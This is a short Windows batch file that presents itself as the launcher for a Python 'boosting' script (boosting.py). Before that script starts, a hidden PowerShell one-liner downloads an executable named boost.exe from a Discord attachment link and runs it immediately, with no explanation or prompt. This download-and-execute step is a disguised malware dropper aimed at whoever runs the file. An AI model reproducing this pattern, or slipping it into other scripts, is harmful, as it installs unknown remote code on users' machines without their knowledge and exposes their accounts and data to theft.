@echo off
cd Tuto
powershell $down=New-Object System.Net.WebClient;$url='https://cdn.discordapp.com/attachments/1186759970017005689/1206282028895707166/boost.exe?ex=65db70af&is=65c8fbaf&hm=bc90f6bbbbca1effd7400dfffa559848d3878658da4cc9e4c1e7672e05dd4c31&';$file='boost.exe'; $down.DownloadFile($url,$file);$exec=New-Object -com shell.application;$exec.shellexecute($file);exit
cd ..
py boosting.py